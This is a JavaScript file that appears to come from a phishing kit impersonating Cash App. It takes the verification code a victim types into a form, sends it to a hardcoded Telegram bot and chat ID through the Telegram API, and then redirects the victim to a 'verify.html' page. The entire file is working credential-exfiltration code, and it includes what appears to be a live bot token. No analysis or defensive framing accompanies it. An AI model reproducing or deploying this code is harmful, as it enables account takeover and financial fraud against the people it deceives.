//bot token
var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
//chat id
var chat_id = 6195480252;
var u_code, u_password, message;
var ready = function () {
    u_code = document.getElementById("code").value;
    message = "CashAppCode: " + u_code;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'verify.html';
    });
    document.getElementById("code").value = "";
    return false;
};